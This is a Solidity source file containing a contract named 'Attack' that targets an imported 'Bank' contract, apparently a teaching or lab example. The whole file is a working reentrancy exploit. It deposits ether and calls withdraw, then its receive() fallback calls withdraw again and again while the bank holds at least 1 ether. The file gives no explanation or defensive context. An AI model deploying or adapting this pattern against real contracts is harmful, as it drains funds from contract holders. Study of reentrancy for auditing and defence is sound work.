// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Bank} from "./Bank.sol";

contract Attack {
    Bank bank;

    constructor(address bankAddress) {
        bank = Bank(bankAddress);
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (bank.totalBalance() >= 1 ether) {
            bank.withdraw();
        }
    }
}
